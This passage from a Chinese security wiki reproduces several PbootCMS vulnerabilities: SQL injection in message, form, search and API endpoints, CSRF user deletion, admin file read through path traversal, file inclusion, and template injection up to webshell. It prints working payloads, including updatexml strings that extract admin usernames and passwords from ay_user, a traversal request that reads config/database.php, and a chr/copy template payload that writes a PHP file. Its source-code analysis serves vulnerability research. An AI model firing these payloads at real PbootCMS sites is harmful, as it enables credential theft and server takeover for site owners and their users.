当传递的参数$where是一个数组时就遍历数组，当$where是一个索引数组时则：$where_string.=$value。 接下来找到“$where”函数中要传递的代码为索引数组时的代码： apps\\home\\controller\\ParserController.php 在“parserSearchLabel()”方法中，传入的数据被分配到变量“$receive”进行遍历，“$key”被带入“request()”进行过滤。 通过上述方法传入索引数组的值只能包含中文、字母、数字、水平线、点、逗号和空格！它由“htmlspecialchars()”和“addslashes()”编码。 最后，它被传递到“$where3”。 “getlists()”中的“$where3”是可控的，它将以“and”的形式进入语句，所以最终造成了SQL注入。 本地复现 默认数据库是sqlite。为了测试方便，我们需要用mysql数据库替换默认数据库。 mysql数据库目录： pbootcms\\static\\backup\\sql\\0cb2353f8ea80b398754308f15d1121e_20200705235534_pbootcms.sql 接下来，我们以POST的形式发送索引数组，还记得源码里数组中的值要以“and”的形式进入“where”条件： 当条件为真时： 当条件为假时： 有效载荷： 由于数据经过过滤，因此只能使用“正则表达式”进行常规匹配。 例如：“用户名=管理员”可以表示为“用户名regepx 0x5E612E2A”，其中“5E612E2A”是“^ a”的十六进制代码。 就可以获得管理员的账号密码了。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:04 "},"Web安全/PbootCMS/PbootCMS csrf/PbootCMS csrf.html":{"url":"Web安全/PbootCMS/PbootCMS csrf/PbootCMS csrf.html","title":"Pboot CMS Csrf","keywords":"","body":"PbootCMS csrf 一、漏洞简介 二、漏洞影响 三、复现过程 我将网站建立在本地，本来想测试添加用户的操作，但是发现这里有formcheck验证，所以失败了 然后我想到了删除用户位置，首先我使用管理员账号登陆，在删除用户的操作时抓包。发现很简单。只有一个id来判断删除哪个用户 于是我直接构造一个新的url，http://127.0.0.1/cve/p/admin.php/User/del/ucode/10004（上面是10003） 确认这个用户是存在的。然后访问http://127.0.0.1/cve/p/admin.php/User/del/ucode/10004 删除成功 但是这样很容易被熟悉的管理员识别，我们可以利用段网站来进行攻击。 短网址生成网站https://www.ft12.com/ http://127.0.0.1/cve/p/admin.php/User/del/ucode/10004 可以缩短为http://u6.gg/gPCcN 访问这个短网址，也可以变为http://127.0.0.1/cve/p/admin.php/User/del/ucode/10004触发漏洞 image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:17 "},"Web安全/PbootCMS/PbootCMS sql注入/PbootCMS sql注入.html":{"url":"Web安全/PbootCMS/PbootCMS sql注入/PbootCMS sql注入.html","title":"PbootCMS sql注入","keywords":"","body":"PbootCMS sql注入 0x01 前台home模块注入漏洞 0x01.1 在线留言处insert sql注入 0x01.1.2 漏洞演示 注：我本地测试的所以我把验证验证码那一步关闭了=-=，实战中请自己加上验证码 url:http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Message/add post: contacts[content`,`create_time`,`update_time`) VALUES ('1', '1' ,1 and updatexml(1,concat(0x3a,user()),1) );-- a] = 1111 content = 1111 mobile = 1111 0x01.1.2 漏洞解读 路径：PbootCMS-V1.2.1\\apps\\home\\controller\\MessageController.php 方法：add( // 留言新增 public function add() { if ($_POST) { if (time() - session('lastsub') config('message_check_code')) { // if (! $checkcode) { // alert_back('验证码不能为空！'); // } if ($checkcode != session('checkcode')) { alert_back('验证码错误！'); } } // 读取字段 if (! $form = $this->model->getFormField(1)) { alert_back('留言表单不存在任何字段，请核对后重试！'); } // 接收数据 $mail_body = ''; foreach ($form as $value) { $field_data = post($value->name); if (is_array($field_data)) { // 如果是多选等情况时转换 $field_data = implode(',', $field_data); } if ($value->required && ! $field_data) { alert_back($value->description . '不能为空！'); } else { $data[$value->name] = post($value->name); $mail_body .= $value->description . '：' . post($value->name) . ''; } } // 设置额外数据 if ($data) { $data['acode'] = session('lg'); $data['user_ip'] = ip2long(get_user_ip()); $data['user_os'] = get_user_os(); $data['user_bs'] = get_user_bs(); $data['recontent'] = ''; $data['status'] = 0; $data['create_user'] = 'guest'; $data['update_user'] = 'guest'; } if ($this->model->addMessage($data)) { session('lastsub', time()); // 记录最后提交时间 $this->log('留言提交成功！'); if ($this->config('message_send_mail') && $this->config('message_send_to')) { $mail_subject = \"【PbootCMS】您有新的表单数据，请注意查收！\"; $mail_body .= '来自网站' . get_http_url() . '（' . date('Y-m-d H:i:s') . '）'; sendmail($this->config(), $this->config('message_send_to'), $mail_subject, $mail_body); } alert_location('提交成功！', '-1'); } else { $this->log('留言提交失败！'); alert_back('提交失败！'); } } else { error('提交失败，请使用POST方式提交！'); } } 可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部 POST 内容，只匹配数据库的字段，相同才会拼接到 $_data数组 然后就会带入 $this->model->addMessage(data) 执行语句 路径：PbootCMS-V1.2.1\\apps\\home\\model\\ParserModel.php 方法：addMessage( // 新增留言 public function addMessage($data) { return parent::table('ay_message')->autoTime()->insert($data); } 根据6.0可以看到带入了进入了 insert 那么我们传的二维数组刚好可以控制key 带入数据库查询引发注入 0x01.2 免费通话insert sql注入 注：本地测试的时候，这个地方的注入需要后台添加一条数据才能注！真实环境的话，开放了这个功能直接抓包即可 进入后台 0x08.2.1 漏洞演示 url：http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Form/add?fcode=2 post： tel[tel`) VALUES ( 1 and updatexml(1,concat(0x3a,user()),1) );-- a] = 1111 0x08.2.2 漏洞解读 路径：PbootCMS-V1.2.1\\apps\\home\\controller\\FormController.php 方法：add( // 表单提交 public function add() { if ($_POST) { if (time() - session('lastsub') config('message_check_code')) { * if (! $checkcode) { * alert_back('验证码不能为空！'); * } * if ($checkcode != session('checkcode')) { * alert_back('验证码错误！'); * } * } */ // 读取字段 if (! $form = $this->model->getFormField($fcode)) { alert_back('接收表单不存在任何字段，请核对后重试！'); } // 接收数据 $mail_body = ''; foreach ($form as $value) { $field_data = post($value->name); if (is_array($field_data)) { // 如果是多选等情况时转换 $field_data = implode(',', $field_data); } if ($value->required && ! $field_data) { alert_back($value->description . '不能为空！'); } else { $data[$value->name] = post($value->name); $mail_body .= $value->description . '：' . post($value->name) . ''; } } // 设置创建时间 if ($data) { $data['create_time'] = get_datetime(); } // 写入数据 if ($this->model->addForm($value->table_name, $data)) { session('lastsub', time()); // 记录最后提交时间 $this->log('提交表单数据成功！'); if ($this->config('message_send_mail') && $this->config('message_send_to')) { $mail_subject = \"【PbootCMS】您有新的表单数据，请注意查收！\"; $mail_body .= '来自网站' . get_http_url() . '（' . date('Y-m-d H:i:s') . '）'; sendmail($this->config(), $this->config('message_send_to'), $mail_subject, $mail_body); } alert_location('提交成功！', '-1'); } else { $this->log('提交表单数据失败！'); alert_back('提交失败！'); } } else { error('提交失败，请使用POST方式提交！'); } } 可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部 POST 内容，只匹配数据库的字段，相同才会拼接到 $_data数组 然后就会带入 $this->model->addForm($value->table_name, $data) 执行语句 路径：PbootCMS-V1.2.1\\apps\\home\\model\\ParserModel.php public function addForm($table, $data) { return parent::table($table)->insert($data); } 根据6.0可以看到带入了进入了 insert 那么我们传的二维数组刚好可以控制key 带入数据库查询引发注入. 0X01.3 前台首页注入 0x08.3.1 漏洞演示 url: http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123 0x01.3.2 漏洞解读 文件地址：PbootCMS-V1.2.1\\apps\\home\\controller\\ParserController.php 方法：index( // 首页 骚操作 注入 // parserAfter -> parserSpecifyListLabel public function index() { $content = parent::parser('index.html'); // 框架标签解析 $content = $this->parser->parserBefore($content); // CMS公共标签前置解析 $content = $this->parser->parserPositionLabel($content, - 1, '首页', SITE_DIR . '/'); // CMS当前位置标签解析 $content = $this->parser->parserSpecialPageSortLabel($content, 0, '', SITE_DIR . '/'); // 解析分类标签 $content = $this->parser->parserAfter($content); // CMS公共标签后置解析 $this->cache($content, true); } 文件地址：apps\\home\\controller\\ParserController.php 方法：parserAfter() 跟进 $content = $this->parser->parserAfter($content); 这个方法 // 解析全局后置公共标签 public function parserAfter($content) { ... $content = $this->parserSpecifyListLabel($content); // 指定列表 return $content; } 方法：parserSpecifyListLabel( 进入以后 查看调用了 $content = $this->parserSpecifyListLabel($content); 方法 // 解析指定分类列表标签 public function parserSpecifyListLabel($content) { ... // 数据筛选 骚操作注入 $where2 = array(); foreach ($_GET as $key => $value) { if (substr($key, 0, 4) == 'ext_') { // 其他字段不加入 $where2[$key] = get($key); } } ... // 读取数据 if ($page) { $data = $this->model->getList($scode, $num, $order, $where1, $where2); } else { $data = $this->model->getSpecifyList($scode, $num, $order, $where1, $where2); } } 这里就将重要的方法分析一下了，其他无关的就删除掉避免影响阅读。 这里接收了外部了外部所有的get参数然后判断了开头的前4个字符是否 ext_ 开头，如果符合就直接拼接进入$where2这个数组 然后带入数据库进行getList方法与getSpecifyList查询，而底层是字符串拼接，过滤了value没有过滤key所以有注入 0x08.4 前台搜索框注入 0x08.4.1 漏洞利用 url:http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Search/index?keyword=aaaa&updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123 0x08.4.2 漏洞讲解 文件地址：PbootCMS-V1.2.1\\apps\\home\\controller\\SearchController.php 方法：index() // 骚操作 注入 // parserSearchLabel public function index() { $content = parent::parser('search.html'); // 框架标签解析 $content = $this->parser->parserBefore($content); // CMS公共标签前置解析 $content = $this->parser->parserPositionLabel($content, 0, '搜索', url('/home/Search/index')); // CMS当前位置标签解析 $content = $this->parser->parserSpecialPageSortLabel($content, 0, '搜索结果', url('/home/Search/index')); // 解析分类标签 $content = $this->parser->parserSearchLabel($content); // 搜索结果标签 $content = $this->parser->parserAfter($content); // CMS公共标签后置解析 $this->cache($content, true); } 文件地址：apps\\home\\controller\\ParserController.php 方法：parserSearchLabel( 进入以后 查看调用了 $content = $this->parser->parserSearchLabel($content); 方法 // 解析内容搜索结果标签 public function parserSearchLabel($content) { ... foreach ($_GET as $key => $value) { if (! ! $value = get($key, 'vars')) { $where2[$key] = $value; } } ... // 读取数据 if (! $data = $this->model->getList($scode, $num, $order, $where1, $where2, $fuzzy)) { $content = str_replace($matches[0][$i], '', $content); continue; } } 这里就将重要的方法分析一下了，其他无关的就删除掉避免影响阅读。 这里接收了外部了外部所有的get参数然后就直接拼接进入$where2这个数组 然后带入数据库进行getList方法查询，而底层是字符串拼接，过滤了value没有过滤key所以有注入 0x10 api模块注入 api模块的注入需要后端开启api功能，并且获得 api_appid 与 api_secret 才能注入。 或是说 开启了api功能并且关闭了API强制认证 这样也可以注入 所以较鸡助 0x10.1 接口注入一 0x10.1.1 漏洞演示 url:http://127.0.0.1/cms/PbootCMS-V1.2.1/api.php/cms/search?1%3D1)and(updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1))--=1 post： 11=11 一定要post 要跑空post才能进流程 因为系统中会把 \"空格\"转为\"_\" 所以使用/**/绕过即可 0x10.1.2 漏洞讲解 路径：apps\\api\\controller\\CmsController.php 方法：search( 这里我把漏洞触发点发出来我们主要讲讲他即可 // 数据接收 foreach ($_GET as $key => $value) { if (! ! $value = get($key, 'vars')) { $where[$key] = $value; } } $data = $this->model->getList($acode, $scode, $num, $order, $where, $fuzzy); 从代码中看他会收集外部所有的 $_GET 带入 getList 进行入库查询 value 是我们无法控制所以无法注入的，可是key是我们可控制可注入的！！！跟进 getList方法 路径：PbootCMS-V1.2.1\\apps\\api\\model\\CmsModel.php function getList( // 列表内容 public function getList($acode, $scode, $num, $order, $where = array(), $fuzzy = true) { ... // 筛选条件支持模糊匹配 return parent::table('ay_content a')->field($fields) ->where($where1, 'OR') ->where($where2) ->where($where, 'AND', 'AND', $fuzzy) ->join($join) ->order($order) ->page(1, $num) ->decode() ->select(); } 这里我把关键代码放出来了，可以看到接收$where以后直接仍进了数据库进行操作造成了注入 0x10.2 接口注入二 0x10.2.1 漏洞利用 url：http://127.0.0.1/cms/PbootCMS-V1.2.1/api.php/cms/addmsg post: contacts[contentl`) VALUES ( updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1) );-- a] = 111 mobile = 111 content = 111 0x10.2.2 漏洞讲解 文件：PbootCMS-V1.2.1\\apps\\api\\controller\\CmsController.php 方法：addmsg( // 新增留言 注入 public function addmsg() { if ($_POST) { // 读取字段 if (! $form = $this->model->getFormField(1)) { json(0, '接收表单不存在任何字段，请核对后重试！'); } // 接收数据 $mail_body = ''; foreach ($form as $value) { $field_data = post($value->name); if ($value->required && ! $field_data) { json(0, $value->description . '不能为空！'); } else { $data[$value->name] = post($value->name); $mail_body .= $value->description . '：' . post($value->name) . ''; } } // 设置其他字段 if ($data) { $data['acode'] = get('acode', 'var') ?: $this->lg; $data['user_ip'] = ip2long(get_user_ip()); $data['user_os'] = get_user_os(); $data['user_bs'] = get_user_bs(); $data['recontent'] = ''; $data['status'] = 0; $data['create_user'] = 'api'; $data['update_user'] = 'api'; } // 写入数据 if ($this->model->addMessage($value->table_name, $data)) { $this->log('API提交表单数据成功！'); if ($this->config('message_send_mail') && $this->config('message_send_to')) { $mail_subject = \"【PbootCMS】您有新的表单数据，请注意查收！\"; $mail_body .= '来自网站' . get_http_url() . '（' . date('Y-m-d H:i:s') . '）'; sendmail($this->config(), $this->config('message_send_to'), $mail_subject, $mail_body); } json(1, '表单提交成功！'); } else { $this->log('API提交表单数据失败！'); json(0, '表单提交失败！'); } } else { json(0, '表单提交失败，请使用POST方式提交！'); } } 可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部 POST 内容，只匹配数据库的字段，相同才会拼接到 $_data数组 然后就会带入 $this->model->addMessage(data) 执行语句 文件：PbootCMS-V1.2.1\\apps\\api\\model\\CmsModel.php 函数：addMessage( // 新增留言 public function addMessage($table, $data) { return parent::table('ay_message')->autoTime()->insert($data); } 根据6.0可以看到带入了进入了 insert 那么我们传的二维数组刚好可以控制key 带入数据库查询引发注入 0x10.3 接口注入三 0x10.3.1 漏洞利用 url：http://127.0.0.1/cms/PbootCMS-V1.2.1/api.php/cms/addform?fcode=1 post: contacts[content`) VALUES ( updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1) );-- a] = 111 mobile = 111 content = 123 0x10.3.2 漏洞讲解 // 表单提交 注入 public function addform() { if ($_POST) { if (! $fcode = get('fcode', 'var')) { json(0, '传递的表单编码fcode有误！'); } // 读取字段 if (! $form = $this->model->getFormField($fcode)) { json(0, '接收表单不存在任何字段，请核对后重试！'); } // 接收数据 $mail_body = ''; foreach ($form as $value) { $field_data = post($value->name); if ($value->required && ! $field_data) { json(0, $value->description . '不能为空！'); } else { $data[$value->name] = post($value->name); $mail_body .= $value->description . '：' . post($value->name) . ''; } } // 设置创建时间 if ($data) { $data['create_time'] = get_datetime(); } // 写入数据 if ($this->model->addForm($value->table_name, $data)) { $this->log('API提交表单数据成功！'); if ($this->config('message_send_mail') && $this->config('message_send_to')) { $mail_subject = \"【PbootCMS】您有新的表单数据，请注意查收！\"; $mail_body .= '来自网站' . get_http_url() . '（' . date('Y-m-d H:i:s') . '）'; sendmail($this->config(), $this->config('message_send_to'), $mail_subject, $mail_body); } json(1, '表单提交成功！'); } else { $this->log('API提交表单数据失败！'); json(0, '表单提交失败！'); } } else { json(0, '表单提交失败，请使用POST方式提交！'); } } 可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部 POST 内容，只匹配数据库的字段，相同才会拼接到 $_data数组 然后就会带入 $this->model->addForm(data) 执行语句 文件：PbootCMS-V1.2.1\\apps\\api\\model\\CmsModel.php 方法：addForm( // 新增表单数据 public function addForm($table, $data) { return parent::table($table)->insert($data); } 根据6.0可以看到带入了进入了 insert 那么我们传的二维数组刚好可以控制key 带入数据库查询引发注入 四、参考链接 https://www.yuque.com/pmiaowu/bfgkkh/lrqvqv Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:23 "},"Web安全/PbootCMS/PbootCMS v2.0.7 任意文件读取/PbootCMS v2.0.7 任意文件读取.html":{"url":"Web安全/PbootCMS/PbootCMS v2.0.7 任意文件读取/PbootCMS v2.0.7 任意文件读取.html","title":"PbootCMS v2.0.7 任意文件读取","keywords":"","body":"PbootCMS v2.0.7 任意文件读取 一、漏洞简介 仅限在Windows下，Linux不支持在不存在的文件夹下上跳，Linux下利用的话得找到一个系统或者程序自带的/script/目录 二、漏洞影响 PbootCMS v2.0.7 三、复现过程 漏洞分析 漏洞文件apps/admin/controller/system/UpgradeController.php $path, 'dfile' => $des_path ); } } // 更新数据库 if (isset($sqls)) { $db = new DatabaseController(); switch (get_db_type()) { case 'sqlite': copy(DOC_PATH . $this->config('database.dbname'), DOC_PATH . STATIC_DIR . '/backup/sql/' . date('YmdHis') . '_' . basename($this->config('database.dbname'))); break; case 'mysql': $db->backupDB(); break; } sort($sqls); // 排序 foreach ($sqls as $value) { $path = RUN_PATH . '/upgrade' . $value; if (file_exists($path)) { //echo $path; //exit; $sql = file_get_contents($path); if (! $this->upsql($sql)) { $this->log(\"数据库 $value 更新失败!\"); json(0, \"数据库\" . basename($value) . \" 更新失败！\"); } } else { json(0, \"数据库文件\" . basename($value) . \"不存在！\"); } } } // 替换文件 if (isset($files)) { foreach ($files as $value) { if (! copy($value['sfile'], $value['dfile'])) { $this->log(\"文件 \" . $value['dfile'] . \" 更新失败!\"); json(0, \"文件 \" . basename($value['dfile']) . \" 更新失败，请重试!\"); } } } // 清理缓存 path_delete(RUN_PATH . '/upgrade', true); path_delete(RUN_PATH . '/cache'); path_delete(RUN_PATH . '/complite'); path_delete(RUN_PATH . '/config'); $this->log(\"系统更新成功!\"); json(1, '系统更新成功！'); } else { json(0, '请选择要更新的文件！'); } } } ... ?> 可以看到注释写着更新数据库的部分，将$sqls遍历出来后放进了file_get_contents函数，然后调用了一个upsql()方法。跟过去看一下。 amd($value); } } return true; } ?> 将传过来的字符串用;分隔后又调用了一个Model::amd()方法。继续跟下去。 文件core/database/Sqlite.php query($sql, 'master'); if ($result) { return $result; } else { return 0; } } // 执行SQL语句,接受完整SQL语句，返回结果集对象 public function query($sql, $type = 'master'){ ... switch ($type) { case 'master': if (! $this->begin) { // 存在写入时自动开启显式事务，提高写入性能 $this->master->exec('begin;'); $this->begin = true; } $result = $this->master->exec($sql) or $this->error($sql, 'master'); break; case 'slave': $result = $this->slave->query($sql) or $this->error($sql, 'slave'); break; } return $result; } // 显示执行错误 protected function error($sql, $conn){ $err = '错误：' . $this->$conn->lastErrorMsg() . '，'; if ($this->begin) { // 存在显式开启事务时进行回滚 $this->master->exec('rollback;'); $this->begin = false; } error('执行SQL发生错误！' . $err . '语句：' . $sql); } ... ?> 这里的amd()方法又调用了一个query()方法，在query()方法里可以看到直接将$sql放进SQL执行函数里，如果执行失败，直接将$sql打印出来。 这样看下来这里的漏洞可以拿来执行任意SQL语句，但是由于这里用的是sqlite数据库，且当前已经在后台里了，所以这里的任意SQL执行也没啥可以利用的。（可能可以审一下用数据库里的数据当做输入的点，没准能利用起来） 但是由于正常的文件内容读出来直接当做SQL语句执行肯定会报错，所以这里可以用来读取文件。 经过回溯可以发现$sqls，使用的POST传输过来的数据，且数据中需要有/script/字符串。 payload URL: http://www.0-sec.org/admin.php?p=/Upgrade/update POST: list=/script/../../../config/database.php 即可读取到文件**（仅限在Windows下，Linux不支持在不存在的文件夹下上跳，Linux下利用的话得找到一个系统或者程序自带的/script/目录）** 参考链接 https://xz.aliyun.com/t/7628 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:26 "},"Web安全/PbootCMS/PbootCMS v2.0.7 前台任意文件包含漏洞/PbootCMS v2.0.7 前台任意文件包含漏洞.html":{"url":"Web安全/PbootCMS/PbootCMS v2.0.7 前台任意文件包含漏洞/PbootCMS v2.0.7 前台任意文件包含漏洞.html","title":"PbootCMS v2.0.7 前台任意文件包含漏洞","keywords":"","body":"PbootCMS v2.0.7 前台任意文件包含漏洞 一、漏洞简介 二、漏洞影响 PbootCMS v2.0.7 三、复现过程 漏洞分析 漏洞发生在PbootCMS内核的模板解析函数中为了方便看直接上一个完整的Parser代码吧 public function parser($file) { // 设置主题 $theme = isset($this->vars['theme']) ? $this->vars['theme'] : 'default'; //file形式:xxxxx/../../../可以双写穿越 $theme = preg_replace('/\\.\\.(\\/|\\\\\\)/', '', $theme); // 过滤掉相对路径 $file = preg_replace('/\\.\\.(\\/|\\\\\\)/', '', $file); // 过滤掉相对路径 if (strpos($file, '/') === 0) { // 绝对路径模板 $tpl_file = ROOT_PATH . $file; } elseif (! ! $pos = strpos($file, '@')) { // 跨模块调用 $path = APP_PATH . '/' . substr($file, 0, $pos) . '/view/' . $theme; define('APP_THEME_DIR', str_replace(DOC_PATH, '', $path)); if (! is_dir($path)) { // 检查主题是否存在 error('模板主题目录不存在！主题路径：' . $path); } else { $this->tplPath = $path; } $tpl_file = $path . '/' . substr($file, $pos + 1); } else { // 定义当前应用主题目录 define('APP_THEME_DIR', str_replace(DOC_PATH, '', APP_VIEW_PATH) . '/' . $theme); if (! is_dir($this->tplPath .= '/' . $theme)) { // 检查主题是否存在 error('模板主题目录不存在！主题路径：' . APP_THEME_DIR); } $tpl_file = $this->tplPath . '/' . $file; // 模板文件 } $note = Config::get('tpl_html_dir') ? '同时检测到您系统中启用了模板子目录' . Config::get('tpl_html_dir') . '，请核对是否是此原因导致！' : ''; file_exists($tpl_file) ?: error('模板文件' . APP_THEME_DIR . '/' . $file . '不存在！' . $note); $tpl_c_file = $this->tplcPath . '/' . md5($tpl_file) . '.php'; // 编译文件 // 当编译文件不存在，或者模板文件修改过，则重新生成编译文件 if (! file_exists($tpl_c_file) || filemtime($tpl_c_file) tplPath, $tpl_file); // 解析模板 file_put_contents($tpl_c_file, $content) ?: error('编译文件' . $tpl_c_file . '生成出错！请检查目录是否有可写权限！'); // 写入编译文件 $compile = true; } //tplPath:PbootCMS/template ob_start(); // 开启缓冲区,引入编译文件 $rs = include $tpl_c_file; if (! isset($compile)) { foreach ($rs as $value) { // 检查包含文件是否更新,其中一个包含文件不存在或修改则重新解析模板 if (! file_exists($value) || filemtime($tpl_c_file) tplPath, $tpl_file); // 解析模板 file_put_contents($tpl_c_file, $content) ?: error('编译文件' . $tpl_c_file . '生成出错！请检查目录是否有可写权限！'); // 写入编译文件 ob_clean(); include $tpl_c_file; break; } } } $content = ob_get_contents(); ob_end_clean(); return $content; } 简单讲一下重点这里对传入路径的过滤并不严格，可以双写绕过再往下跟一下当模板文件不在缓存中的时候，会读取$tpl_file中的内容，然后写入缓存文件中并且包含。也就是说，当parser函数的参数可以被控制的时候，就会造成一个任意文件包含。所以，要找一个可控参数的parser调用经过简单寻找，就可以发现前台控制器TagController中的index方法，完美符合我们的要求上代码： public function index() { // 在非兼容模式接受地址第二参数值 if (defined('RVAR')) { $_GET['tag'] = RVAR; } if (! get('tag')) { _404('您访问的页面不存在，请核对后重试！'); } $a=get('tag'); $tagstpl = request('tagstpl'); if (! preg_match('/^[\\w\\-\\.\\/]+$/', $tagstpl)) { $tagstpl = 'tags.html'; } $content = parent::parser($this->htmldir . $tagstpl); // 框架标签解析 $content = $this->parser->parserBefore($content); // CMS公共标签前置解析 $content = $this->parser->parserPositionLabel($content, 0, '相关内容', homeurl('tag/' . get('tag'))); // CMS当前位置标签解析 $content = $this->parser->parserSpecialPageSortLabel($content, - 2, '相关内容', homeurl('tag/' . get('tag'))); // 解析分类标签 $content = $this->parser->parserAfter($content); // CMS公共标签后置解析 $this->cache($content, true); } 传入parser的参数，是通过request接收的参数$tagstpl和$this->htmldir拼接的，因为已经知道在函数内部可以出现目录穿越，所以前面的路径不管怎么拼接都无所谓啦。这样就完成了整个攻击链，TagController->parser->双写绕过->文件读取->文件写入->文件包含 漏洞复现 因为是windows搭的环境，就不读/etc/passwd了，读一下D盘根目录的文件吧 成功再包含个phpinfo试试也是可以的漏洞验证完成本来是想再看看有没有什么组合利用的姿势，毕竟文件包含这种洞本身利用的灵活度还是蛮高的不过既然最新版已经修了 就不多看了 参考链接 https://xz.aliyun.com/t/7744 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:27 "},"Web安全/PbootCMS/PbootCMS v2.0.7 模板注入/PbootCMS v2.0.7 模板注入.html":{"url":"Web安全/PbootCMS/PbootCMS v2.0.7 模板注入/PbootCMS v2.0.7 模板注入.html","title":"PbootCMS v2.0.7 模板注入","keywords":"","body":"PbootCMS v2.0.7 模板注入 一、漏洞简介 二、漏洞影响 PbootCMS v2.0.7 三、复现过程 漏洞分析 文件：apps/home/controller/ParserController.php 精简后的代码如下： 这里大概的意思就是，在模板的if语句中，通过正则找到函数的结构，然后将其传入function_exists，如果该函数存在则不执行下面的eval() 如果可以编辑模板文件，或者存在模板注入的话，那么就可以尝试绕一下这些限制，看能不能往eval()里面注入代码。 在后台翻了一下，没有看到有对模板文件进行修改的地方，所以考虑模板注入。 在后台的公司信息栏目插入符合模板if语句的 Payload: {pboot:if(1)}OK{/pboot:if} 可以看到这里的模板语句已经解析了。所以这里是存在模板注入的。 但是这个程序是有对所有参数进行全局的htmlspecialchars和addslashes的，在结合上面的正则，导致我们不能使用很多字符。 有：'\"$}和反引号、\\x00等等。 根据这个限制我很快有了一种思路： php的语法有一些具有函数结构，但是却不是函数的关键字。 例如：include()、array()等。 现在思路就很明确了，既然 include()可以绕过函数检测这个点，那么往里面传参数就完事了。 接下来就是要想办法在当前限制下构造出一个字符串往include()里面传了。 思路1： 通过$_SERVER数组传，但是前面的正则ban了$，所以这个思路不行。 思路2： 使用get_defined_vars()从get的参数里面获取，但是get_defined_vars不能过function_exists，所以也不行。 思路3： PHP7.2版本开始：不带引号的字符串是不存在的全局常量的话，那么则转化成他们自身的字符串。 意思就是echo a=>define(a, 'a');echo a; 那么就可以不使用引号，从而构造字符串了。 所以我们可以在后台上传一个图片马，然后用include()去包含getshell了。 但是这里有个问题，上传后的图片路径会有数字和/、.，而数字和/、.不带引号是不会触发上面说的trick的。 也就是现在能构造任意字母了，但是还需要数字和/、. /和.其实很好办，PHP有几个预定义常量如__FILE__，获取当前的文件的绝对路径 在程序里打印一下看看 .和/都有，但是直接用数组的方式去取是会报错的。 这时候就需要用到刚刚说的array()了，将__FILE__放进array()里之后再利用去二维数组的方式去取就不会报错了。（因为这里是将常量赋值进了数组里面，不是直接对常量进行数组的方式取值，所以不会报错。） var_dump(array(__FILE__)[0][-4]); //=. var_dump(array(__FILE__)[0][-21]); //=/ 现在就缺数字了，而且该数字还必须是String型的数字。 PHP下还有带有数字的常量，例如__LINE__、__PHP_VERSION__，但是这些数字可能不太够，而且也不太能确定具体得值，不够\\\"一般化\\\"。 于是开始寻找别的办法。 于是我开始全局搜索define(，寻找在程序中定义的，可控或者含有数字的常量。 文件：core/view/Paging.php start) || $this->start start = 1; } if ($this->start > $total) { $this->start = $total + 1; } // 设置总数 if ($total) { $this->rowTotal = $total - ($this->start - 1); } // 设置分页大小 if (! isset($this->pageSize)) { $this->pageSize = get('pagesize') ?: Config::get('pagesize') ?: 15; } // 分页数字条数量 $this->num = Config::get('pagenum') ?: 5; // 计算页数 $this->pageCount = @ceil($this->rowTotal / $this->pageSize); // 获取当前页面 $this->page = $this->page(); // 定义相关常量，用于方便模板引擎解析序号等计算和调用 define('ROWTOTAL', $this->rowTotal); define('PAGECOUNT', $this->pageCount); define('PAGE', $this->page); define('PAGESIZE', $this->pageSize); // 注入分页模板变量 $this->assign($morePageStr); // 返回限制语句 return ($this->page - 1) * $this->pageSize + ($this->start - 1) . \",$this->pageSize\"; } // 当前页码容错处理 private function page(){ $page = get('page', 'int') ?: $this->page; if (is_numeric($page) && $page > 1) { if ($page > $this->pageCount && $this->pageCount) { return $this->pageCount; } else { return $page; } } else { return 1; } } ... ?> 这里是该程序的一个分页类，可以看到里面有一个叫PAGE的常量，且该常量可控。 那么就寻找调用了这个分页类的地方传入page就好。 例如：http://www.0-sec.org/?keyword=123&page=0123456789 且该常量为string类型。 至此，路径中需要的字符都构造出来了，只需要用.连接即可。 漏洞复现 上传图片马 得到路径static/upload/image/20200417/1587111957160139.png 根据路径构造payload include(s.tatic.array(__FILE__)[0][0].upload.array(__FILE__)[0][0].image.array(__FILE__)[0][0].array(PAGE)[0][2].array(PAGE)[0][0].array(PAGE)[0][2].array(PAGE)[0][0].array(PAGE)[0][0].array(PAGE)[0][4].array(PAGE)[0][1].array(PAGE)[0][7].(马赛克).png) 将payload放入模板的if语句中 模板注入 访问带有分页类且又能输出公司地址的地方 Getshell成功！！！ 补充 一开始在研究这个漏洞的时候，就觉得有点麻烦，又要上传图片马，又要构造图片马的路径，不能一个payload直接打，十分麻烦。 于是就跑去问了问P师傅**（P牛，永远滴神！）** P师傅理解了我的需求后，直接甩了个payload给我 看到后我才想起，以前就看过P师傅的一篇文章里面的一个trick：在一个函数的括号前面加入一些控制字符，PHP一样能识别改函数并执行。利用这个trick就可以执行任意函数了。 于是根据P师傅给的思路再结合程序本身的一些其他的黑名单限制，很快我就构造出了一个通用的Payload {pboot%3aif(copy%01(chr%01(104).chr%01(116).chr%01(116).(马赛克),chr%01(49).chr%01(46).chr%01(112).chr%01(104).chr%01(112)))}asdasdasd{/pboot%3aif} 